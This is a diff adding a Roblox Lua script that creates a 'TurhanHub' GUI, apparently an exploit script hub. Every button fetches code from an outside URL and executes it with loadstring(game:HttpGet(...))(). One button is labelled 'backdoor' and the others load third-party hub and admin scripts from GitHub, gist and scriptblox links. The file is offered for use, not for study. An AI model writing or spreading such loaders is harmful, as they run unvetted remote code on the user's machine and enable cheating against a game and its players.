@@ -1,0 +1,60 @@
+-- Create the Screen GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "TurhanHub"
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a frame for the GUI
+local frame = Instance.new("Frame")
+frame.Parent = gui
+frame.Size = UDim2.new(0.3, 0, 0.4, 0)
+frame.Position = UDim2.new(0.35, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true -- Allow moving with touch or mouse
+
+-- Add a UI layout for buttons
+local layout = Instance.new("UIListLayout")
+layout.Parent = frame
+layout.Padding = UDim.new(0, 5)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.VerticalAlignment = Enum.VerticalAlignment.Top
+
+-- Helper function to create buttons
+local function createButton(name, loadstringCode)
+    local button = Instance.new("TextButton")
+    button.Text = name
+    button.Size = UDim2.new(0.8, 0, 0.1, 0)
+    button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.SourceSans
+    button.TextScaled = true
+    button.Parent = frame
+
+    button.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet(loadstringCode))()
+    end)
+end
+
+-- Create buttons for the scripts
+createButton("backdoor", "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua")
+createButton("LALOL", "https://scriptblox.com/raw/Universal-Script-LALOL-HUB-11604")
+createButton("QuirkyCMD", "https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw")
+createButton("EdgelY", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+
+-- Add an on/off toggle button outside the GUI
+local toggleButton = Instance.new("TextButton")
+toggleButton.Text = "On/Off"
+toggleButton.Size = UDim2.new(0.1, 0, 0.05, 0)
+toggleButton.Position = UDim2.new(0.45, 0, 0.05, 0) -- Outside the GUI box
+toggleButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+toggleButton.Font = Enum.Font.SourceSans
+toggleButton.TextScaled = true
+toggleButton.Parent = gui
+
+local guiVisible = true
+toggleButton.MouseButton1Click:Connect(function()
+    guiVisible = not guiVisible
+    frame.Visible = guiVisible
+end)
